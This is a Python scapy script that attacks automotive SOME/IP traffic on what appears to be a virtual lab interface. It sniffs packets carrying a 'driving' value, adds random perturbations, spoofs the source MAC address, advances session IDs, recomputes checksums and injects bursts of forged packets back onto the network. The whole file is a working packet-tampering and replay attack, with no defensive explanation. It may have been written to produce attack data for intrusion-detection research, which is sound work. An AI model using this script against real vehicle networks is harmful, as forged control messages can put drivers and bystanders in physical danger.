from scapy.all import *
from scapy.contrib.automotive.someip import *

from common import update_udp_chksum
from common import Replay
import pdb
import time
import struct
import numpy as np

variables = [random.random()-0.5 for _ in range(100)]
index = 0

def process_packet(packet):
    global index
    driving = struct.unpack('>f', bytes(packet[SOMEIP].payload)[:4])[0]

    packets = []
    for _ in range(Replay.packet_series_count):
        driving_tempered = driving + variables[index]
        if driving_tempered < 0:   driving_tempered = 0
        elif driving_tempered > 1: driving_tempered = 1

        index += 1
        if index >= 100:
            index = 0
        data = struct.pack('>f', driving_tempered) + bytes(packet[SOMEIP].payload)[4:]
        packet[SOMEIP].payload = Raw(load=data)
        packet[IP].ttl = 5
        packet[Ether].src = '00:00:00:00:00:08'
        packet[SOMEIP].session_id += 10
        if packet[SOMEIP].session_id >= 65535:
            packet[SOMEIP].session_id = 1

        packet = update_udp_chksum(packet)
        packets.append(packet)
    print(f"[Replay] driving_orig({driving}), driving_temp({driving_tempered})")
    sendp(packets, iface='veth0.3', inter=Replay.driving_interval)

filter = "udp and src host 10.0.3.2 and src port 32001"
sniff(filter=filter, iface='veth0.3', prn=process_packet)

